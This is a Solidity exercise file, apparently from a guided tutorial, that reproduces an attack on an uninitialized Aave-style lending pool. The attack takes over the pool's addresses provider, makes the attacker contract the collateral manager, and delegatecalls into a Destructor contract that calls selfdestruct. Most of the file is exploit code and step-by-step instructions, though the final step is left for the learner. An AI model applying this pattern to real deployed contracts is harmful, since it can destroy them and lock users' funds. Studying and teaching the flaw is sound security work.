//SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface IPool {
    function initialize(address) external;
}

contract Contract {
    IPool pool = IPool(0x987115C38Fd9Fd2aA2c6F1718451D167c13a3186);


/*
Call the initialize function on the pool and set the addresses provider to be
the address of the Contract.
*/
    constructor() {
        pool.initialize(address(this));
        
    }


/*
Lending Manager
Among it's many responsibilities, the addresses provider is responsible for providing the lending pool collateral manager's address. You can see this in the source code here.

In the last stage, you successfully set the addresses provider to be the Contract. This means, when getLendingPoolCollateralManager is called in the context of the Lending Pool, it will call the Contract to get the address.

As you can see in the Contract.sol file there is already a getLendingPoolCollateralManager method defined. Let's return the Contract's address as the lending pool collateral manager. We'll see why this is necessary in the next step!

 Your Goal: Return Contract Address
In the getLendingPoolCollateralManager method, return the address of the Contract.


*/
    function getLendingPoolCollateralManager() external view returns (address) {
        return address(this);
    }

    function liquidationCall(address,address,address,uint256,bool) external returns(uint, string memory) {
    
    }
}



/*
Destruct
Now that the collateral manager has been set to be our contract, we can have the LendingPool make a delegate call to our contract via the liquidation call method.

This is the critical part of the vulnerability! At this point, we can self-destruct the Lending Pool contract because delegate call allows us to run code in the context of the lending pool itself.

However, this is one catch here. We cannot call selfdestruct directly in the Contract because we need to return 0 for the returnCode so the transaction does not revert (see these three lines).

Instead, we can delegate call further to the Destructor contract, which can self-destruct. Then we can return 0 for the returnCode so the transaction does not revert.

 Your Goal: Self Desruct!
This part is tricky! You will need to delegatecall to the Destructor contract. The delegatecall method is available on the address type. We do know the destructor's address ahead of time, it is: 0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0.

Follow the address type delegate call documentation to figure out how to call the destruct function with a delegatecall, or you can take a look at how its done in the lending pool liquidation call for inspiration.

Finally, be sure to return a tuple containing zero and an empty string so that the lending pool liquidationCall does not revert.
*/

// deployed @ 0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0
contract Destructor {
    function destruct() external{
        selfdestruct(msg.sender);
    }   
}